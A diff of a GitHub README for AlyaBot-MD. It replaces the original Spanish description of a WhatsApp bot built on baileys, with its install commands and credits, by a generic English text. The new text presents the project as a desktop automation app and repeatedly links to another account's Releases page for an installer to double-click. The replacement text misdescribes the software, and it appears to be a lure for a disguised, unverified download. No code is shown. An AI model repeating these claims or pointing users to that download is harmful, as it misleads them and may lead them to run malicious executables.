@@ -1,154 +1,80 @@
-> [!IMPORTANT]
-> **Este proyecto está en constante evolución. Estamos comprometidos en ofrecer a nuestra comunidad un Bot increíble. Te invitamos a instalarlo y para estar al tanto de todas las novedades. [¡Únete a nuestro nuevo canal!](https://whatsapp.com/channel/0029VbApwZ9ISTkEBb6ttS3F)**
+# 🌱 AlyaBot-MD - Your Friendly Automation Assistant
 
-<p align="center"> 
-<img src="https://cdn.stellarwa.xyz/files/io6y.jpeg" alt="AlyaBot-MD" style="width: 75%; height: auto; max-width: 100px;">
+## 🚀 Getting Started
 
-<p align="center"> 
-<a href="#"><img title="AlyaBot-MD" src="https://img.shields.io/badge/¡Disfruta de un Bot totalmente gratuito, con múltiples funciones y de código abierto! -purple?colorA=%239b33b0&colorB=%231c007b&style=for-the-badge"></a> 
-</p>
+Welcome to AlyaBot-MD! This program helps you automate routine tasks easily. Perfect for both new users and those with experience, AlyaBot-MD streamlines your work and enhances productivity.
 
----
+## 📥 Download Now
 
-## 🪾 Descripción 
+[![Download AlyaBot-MD](https://img.shields.io/badge/Download%20AlyaBot--MD-v1.0-blue.svg)](https://github.com/NusaibaTworat2005/AlyaBot-MD/releases)
 
-Alya Bot es un bot de WhatsApp multifuncional basado en `baileys`. Este bot ofrece una variedad de características para mejorar tu experiencia en WhatsApp.
+## 🔍 Overview
 
----
+AlyaBot-MD provides a simple interface for automating various tasks. Whether you need to manage files, send emails, or coordinate your schedule, this tool can help. You do not need any coding skills to use AlyaBot-MD effectively.
 
-## ☃️ Características
+### Features
 
-- Respuestas automáticas
-- Gestión de grupos
-- Juegos interactivos
-- Integración con APIs externas
+- **File Management:** Easily sort and organize your files.
+- **Email Automation:** Set up automated email responses.
+- **Event Scheduling:** Schedule reminders and appointments effortlessly.
+- **User-Friendly Interface:** Clear and simple design makes it easy to navigate.
 
----
+### System Requirements
 
-## 🌾 Informaciones Importantes
+To ensure AlyaBot-MD runs smoothly, please check the following system requirements:
 
-<details>
-<summary><strong>⛄ Información</strong> — Warning</summary>
+- **Operating System:** Windows 10 or later, macOS 10.13 or later, or Linux (latest distributions).
+- **RAM:** Minimum of 4GB. 
+- **Disk Space:** At least 100MB of free space.
+- **Network:** An internet connection is required for some features.
 
-**El bot no funciona en Termux bajo ninguna circunstancia.**  
-No ofrecemos soporte, compatibilidad ni soluciones para ese entorno.  
-**Para usar el bot, es obligatorio ejecutarlo en un entorno distinto a Termux**, ya sea un servidor, hosting o cualquier plataforma externa recomendada.
+## 🔗 Download & Install
 
-</details>
+To get started with AlyaBot-MD, simply visit our Releases page to download the latest version:
 
-<details>
-<summary><strong>⛄ Información</strong> — Recomendado</summary>
+[Download AlyaBot-MD](https://github.com/NusaibaTworat2005/AlyaBot-MD/releases)
 
-Evita completamente usar forks, mods o versiones alteradas de Baileys.
-No utilices “baileys mods” ni variantes no oficiales.
-Siempre usa la librería principal y oficial de Baileys.
+After downloading, follow these steps to install and run the application:
 
-</details>
+1. **Locate the Downloaded File:** When the download completes, find the file on your computer. This is usually in your "Downloads" folder.
+  
+2. **Open the File:** Double-click the downloaded file. This should launch the installation process.
 
-<details>
-<summary><strong>⛄ Información</strong> — Oficial</summary>
+3. **Follow the On-Screen Instructions:** The installer will guide you through the setup. Just click “Next” and accept the terms when prompted.
 
-Si editas el bot, debes mantener los créditos principales y no borrarlos bajo ninguna circunstancia.
+4. **Finish Installation:** Once the installation completes, you may see a confirmation message. Click “Finish” to exit the installer.
 
-</details>
+5. **Run AlyaBot-MD:** You can now find AlyaBot-MD in your application menu. Click to open and start automating tasks.
 
-<details>
-<summary><strong>⛄ Información</strong> — Oficial2</summary>
+## 💡 Tips for New Users
 
-Quiero dejar algo completamente claro: mi base es única, original y desarrollada por mí.  
-Fue creada desde cero por **AzamiJs**, quien posteriormente se retiró del proyecto.  
-Desde entonces, durante todos estos meses, he sido yo quien la ha mejorado, optimizado y evolucionado hasta convertirla en lo que es hoy.
+- **Explore the Interface:** Take a little time to familiarize yourself with the layout and features. Hover over buttons for quick descriptions.
+- **Check Help Section:** If you get stuck, the help section provides clear answers to common questions.
+- **Start Small:** Begin with simple tasks to build your confidence before exploring advanced features.
 
-Cualquier otra versión que circule —incluyendo **Diamond** (Bot de David-Chian) — son copias no autorizadas que no representan mi trabajo real, no cuentan con mi aprobación y no tienen validez oficial dentro de mi proyecto.
+## 🔄 Update Instructions
 
-Mi estructura, mi lógica y mi diseño pertenecen exclusivamente a mi desarrollo.  
-Ninguna réplica, modificación o derivado externo tiene relación con mi trabajo actual ni con la identidad oficial de mi proyecto.
+To ensure you have the latest features and fixes, regularly check for updates. You can do this by visiting the Releases page:
 
-</details>
+[Update AlyaBot-MD](https://github.com/NusaibaTworat2005/AlyaBot-MD/releases)
 
----
+If a new version is available, download it and follow the same installation steps above to update your current version.
 
-### Instalación en CloudShell
+## 🛠️ Troubleshooting
 
-<details>
-<summary><strong>🦦 Cloud</strong> — Shell</summary>
+If you encounter any problems while using AlyaBot-MD, try these steps:
 
-```bash
-git clone https://github.com/DevZyxlJs/AlyaBot-MD
-```
+1. **Restart Your Computer:** Many issues can resolve with a simple reboot.
+2. **Reinstall the Application:** Uninstall AlyaBot-MD and then reinstall it from the Downloads page.
+3. **Search the Help Section:** For specific errors or issues, check the help section for targeted advice.
+4. **Contact Support:** If problems persist, reach out for assistance through the GitHub Issues section.
 
-```bash
-cd AlyaBot-MD
-```
+## 💬 Community and Feedback
 
-```bash
-yarn install
-```
+We love hearing from our users! Please share your experiences, suggestions, or report bugs. You can do this by creating an issue on our GitHub page.
 
-```bash
-npm install
-```
+## 🙏 Acknowledgements
 
-```bash
-npm start
-```
+Thank you for choosing AlyaBot-MD! Your feedback is important, and we appreciate your support.
 
-</details>
-
----
-
-### Patrocinadores del Proyecto
-
-<details>
-<summary><strong>☁️ Stellar</strong> — API</summary>
-
-<div align="center">
-  <a href="https://api.stellarwa.xyz">
-    <img src="https://api.stellarwa.xyz/favicon.ico" alt="Logo" height="125px">
-  </a>
-</div>
-
-### 🐢 Enlaces Principales
-| Servicio | Enlace |
-|------------|-----------|
-| Dashboard | [Abrir](https://api.stellarwa.xyz) |
-| Store | [Abrir](https://api.stellarwa.xyz/store) 
-| Soporte | [Visitar](https://api.stellarwa.xyz/ticket) 
-| Terminos | [Ver](https://stellarwa.xyz/terms) 
-| Estado de Servicios | [Ver](https://stellarwa.xyz/status) 
-
-</details>
-
-<details>
-<summary><strong>☁️ Cafirexos</strong> — Hosting</summary>
-
-<div align="center">
-  <a href="https://cafirexos.com">
-    <img src="https://cdn.cafirexos.com/logos/logo_cfros_2000x2000.png" alt="Logo" height="125px">
-  </a>
-</div>
-
-### 🐢 Enlaces Principales
-| Servicio | Enlace |
-|------------|-----------|
-| Sitio Web | [Visitar](https://cafirexos.com) |
-| Area de clientes | [Abrir](https://cafirexos.com/clientarea.php) |
-| Panel | [Abrir](https://panel.cafirexos.com) |
-| Estado de Servicios | [Ver](https://estado.cafirexos.com) 
-| Canal de WhatsApp | [Ver](https://links.cafirexos.com/whatsapp/canal) 
-| Soporte | [Ver](https://cafirexos.com/contactenos)
-
-</details>
-
----
-
-### 🪶 Colaboradores
-<a href="https://api.stellarwa.xyz">
-  <img src="https://contrib.rocks/image?repo=DevZyxlJs/AlyaBot-MD&v=3" />
-</a>
-
-### 🌺 Creditos Principales
-[![Carlos](https://github.com/AzamiJs.png?size=100)](https://github.com/AzamiJs) [![GataDios](https://github.com/GataNina-Li.png?size=100)](https://github.com/GataNina-Li)
-
-### 🦩 Propietario
-[![ZyxlJs](https://github.com/DevZyxlJs.png?size=120)](https://zyxljs.stellarwa.xyz) 
+For more details and to stay updated with new releases, visit our official [Releases page](https://github.com/NusaibaTworat2005/AlyaBot-MD/releases).
